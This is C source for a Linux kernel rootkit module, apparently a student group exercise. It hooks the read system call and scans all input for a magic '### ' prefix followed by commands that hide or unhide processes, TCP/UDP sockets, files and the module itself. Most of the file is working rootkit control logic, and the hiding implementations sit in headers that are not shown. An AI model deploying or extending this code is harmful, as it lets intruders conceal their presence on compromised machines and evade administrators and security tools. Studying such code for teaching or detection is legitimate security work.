#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
//#include <linux/sched.h>
//#include <linux/list.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hook_read.h"
#include "hide_module.h"
#include "hide_processes.h"
#include "hide_sockets.h"
#include "hide_files.h"

char activate_pattern[] = "### ";
int size_of_pattern = sizeof(activate_pattern)-1;
int magic_word_pos = 0;
int last_match = -1;

// stuff for "internal command line"
char command_buffer[1024];
int command_pos = 0;
char param_buffer[1024];
int param_pos = 0;

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);
typedef void (*fun_void_int)(int);

#define INVALID          0
#define MATCH_MAGIC_WORD 1
#define MATCH_COMMAND    2
#define READ_PARAM       3

static int state = 0;

fun_void_int command;



void match_magic_word(char c){
    if(last_match+1 == magic_word_pos){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[magic_word_pos]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            magic_word_pos++;
            if(last_match == size_of_pattern-1){
                //finished with matching magic word
                state++;
                OUR_DEBUG("Recognized magic word\n");
            }
        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            if(magic_word_pos != 0){
                last_match--;
                magic_word_pos--;
            }
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            magic_word_pos++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == 127 || c == '\b'){
//            OUR_DEBUG("backspace wrong");
            if(magic_word_pos != 0){
                magic_word_pos--;
            } else {
                state = INVALID;
            }
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            magic_word_pos++;
        }
    }
}

void match_command(char c){
    if(c == ' '){ // go to next command
        command_buffer[command_pos] = '\0';
        if (strcmp(command_buffer, "hideproc")==0){
            state++;
            command = hide_proc;
        } else if(strcmp(command_buffer, "unhideproc")==0){
            state++;
            command = unhide_proc;
        } else if(strcmp(command_buffer, "hidemodule")==0){
            OUR_DEBUG("Hide this module.\n");
            state = INVALID;
            hide_module();
        } else if(strcmp(command_buffer, "unhidemodule")==0){
            OUR_DEBUG("Unhide this module.\n");
            state = INVALID;
            unhide_module();
        } else if(strcmp(command_buffer, "hidetcp")==0){
            state++;
            command = hideTCP;
        } else if(strcmp(command_buffer, "hideudp")==0){
            state++;
            command = hideUDP;
        } else if(strcmp(command_buffer, "unhidesocket")==0){
            OUR_DEBUG("Unhide socket.\n");
            state = INVALID;
            unhideSocket();
        } else if(strcmp(command_buffer, "hidefiles")==0){
            OUR_DEBUG("Hide files.\n");
            hide_files();
        } else if(strcmp(command_buffer, "unhidefiles")==0){
            OUR_DEBUG("Unhide files.\n");
            state = INVALID;
            unhide_files();
        } else {
            OUR_DEBUG("INVALID COMMAND: %s\n", command_buffer);
            state = INVALID;
            //unknown command
        }
    } else {// fill buffer
        if(c == 127 || c == '\b'){
            if(command_pos != 0){
                command_pos--;
            } else{
                state--;
            }
        } else {
            if(command_pos>1023){
                state=INVALID;
                return;
            }
            command_buffer[command_pos++] = c;
        }
    }
}

void read_param(char c){
    char **end = kmalloc(1*sizeof(char*), GFP_KERNEL);
    unsigned long param;
    if(c== ' '){
        param_buffer[param_pos] = '\0';
        param = simple_strtoul(param_buffer, end, 10);
        command(param);
        state = INVALID;
    } else {// fill buffer
        if(c == 127 || c == '\b'){
            if(param_pos != 0){
                param_pos--;
            } else{
                state--;
            }
        } else {
            if(param_pos>1023){
                state=INVALID;
                return;
            } else {
                param_buffer[param_pos++] = c;
            }
        }
    }
}

static void handleChar(char c){
    if(c == '\r' || c == '\n'){ //reset on newline
        state = INVALID;
        return;
    }
    switch(state) {
    case INVALID:
        last_match = -1;
        magic_word_pos = 0;
        command_pos = 0;
        param_pos = 0;
        state++;
        //no break: reset and qimmediatelly start with matching
    case MATCH_MAGIC_WORD:
        match_magic_word(c);
        return;
    case MATCH_COMMAND:
        match_command(c);
        return;
    case READ_PARAM:
        read_param(c);
        return;
    }
}

static void handle_input(char *buf, int count)
{
    int i;
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    hook_read(handle_input);
    load_sockethiding();
    load_processhiding();
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    OUR_DEBUG("Unloading processhiding...\n");
    unload_processhiding();
    OUR_DEBUG("Unloading sockethiding...\n");
    unload_sockethiding();
    OUR_DEBUG("Unloading modulehiding...\n");
    unhide_module();
    OUR_DEBUG("Unhooking read...\n");
    unhook_read();
    OUR_DEBUG("Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
